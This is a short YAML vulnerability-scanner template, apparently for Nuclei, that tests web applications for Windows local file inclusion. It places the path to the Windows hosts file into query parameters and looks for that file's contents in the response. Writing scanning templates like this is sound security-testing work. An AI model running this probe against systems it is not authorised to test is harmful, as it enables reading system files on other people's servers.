http:
- fuzzing:
  - fuzz:
    - '{{reflection}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - part: body
    type: word
    words:
    - '# localhost name resolution is handled within DNS itself.'
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    reflection:
    - c:/WINDOWS/system32/drivers/etc/hosts
  stop-at-first-match: true
id: windows-lfi-automation
info:
  author: rix4uni
  name: Local File Inclusion - Windows
  severity: critical
  tags: lfi,windows
